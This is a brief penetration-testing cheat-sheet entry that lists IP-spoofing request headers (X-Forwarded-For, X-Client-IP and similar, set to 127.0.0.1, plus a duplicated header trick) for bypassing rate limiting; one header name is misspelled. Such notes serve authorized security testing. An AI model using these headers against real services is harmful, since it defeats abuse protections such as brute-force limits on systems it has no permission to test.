# Rate Limit Bypass

Attempt to add the following headers and see if you can bypass rate limiting by changing the IP origin:

```bash
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
X-Forwared-Host: 127.0.0.1

# You can also attempt to use two of the same header:
X-Forwarded-For:
X-Forwarded-For: 127.0.0.1
```
